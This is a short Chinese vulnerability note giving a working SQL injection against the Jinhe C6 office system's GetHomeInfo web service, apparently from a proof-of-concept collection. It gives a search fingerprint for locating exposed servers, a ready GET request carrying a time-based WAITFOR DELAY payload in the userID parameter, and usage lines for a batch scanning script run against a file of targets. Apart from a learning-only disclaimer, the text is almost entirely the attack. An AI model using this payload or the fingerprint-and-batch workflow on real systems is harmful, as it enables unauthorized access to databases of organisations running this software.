# 金和-c6 gethomeinfo sql注入

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

金和-c6 gethomeinfo sql注入

指纹  body="JHSoft.Web.AddMenu" 

GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:3%27-- 



直接GET请求即可



批量poc(记得安装库)

python poc.py -u 



python poc.py -f  .txt

